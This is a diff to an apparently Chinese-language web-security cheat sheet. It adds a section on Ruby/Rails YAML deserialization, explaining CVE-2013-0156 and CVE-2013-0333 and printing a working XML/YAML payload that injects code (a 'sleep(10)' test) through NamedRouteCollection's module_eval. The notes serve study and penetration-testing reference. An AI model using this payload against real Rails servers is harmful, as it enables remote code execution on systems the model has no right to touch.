@@ -24,6 +24,7 @@ Table of Contents
     * [PHP Serialize](#php---serialize--unserialize)
     * [Python Pickle](#python-pickle)
     * [Ruby Marshal](#rubyrails-marshal)
+    * [Ruby YAML](#rubyrails-yaml)
 *  [SSTI](#ssti)
     * [Flask/Jinja2](#flaskjinja2)
     * [AngularJS](#angularjs)
@@ -1173,6 +1174,36 @@ print marshalled
 - Cookie Serializer
     - Rails 4.1以前的Cookie Serializer為Marshal
     - Rails 4.1開始，默認使用JSON
+
+## Ruby/Rails YAML
+
+- CVE-2013-0156
+    - 舊版本的Rails中，`XML`的node可以自訂type，如果指定為`yaml`，是會被成功解析的
+    - 若反序列化`!ruby/hash`，則相當於在物件上調用`obj[key]=val`，也就是`[]=`方法
+    - 而這個`ActionDispatch::Routing::RouteSet::NamedRouteCollection`中的`[]=`方法中，有一條代碼路徑可以eval
+    - `define_hash_access`中可以看到`module_eval`，裏頭的`selector`來自`name`
+    - 因為他還會對`value`調用`default` method，所以可以利用`OpenStruct`來構造
+        - `函數名=>返回值`的對應關係存放在`@table`中
+    - Payload:
+    ```ruby
+    xml = %{  
+    <?xml version="1.0" encoding="UTF-8"?>  
+    <bingo type='yaml'>  
+    ---| !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection  
+    'test; sleep(10); test' :  
+     !ruby/object:OpenStruct  
+      table:  
+       :defaults: {}  
+    </bingo>
+
+    }.strip
+    ```
+- CVE-2013-0333
+    - Rails 2.3.x和3.0.x中，允許`text/json`的request轉成`YAML`解析
+    - `Yaml`在Rails 3.0.x是預設的`JSOM Backend`
+    - 出問題的地方在於`YAML.load`前的`convert_json_to_yaml`，他不會檢查輸入的JSON是否合法
+    - 一樣可以透過`ActionController::Routing::RouteSet::NamedRouteCollection#define_hash_access `的`module_eval`來RCE
+
 
 
 # SSTI 
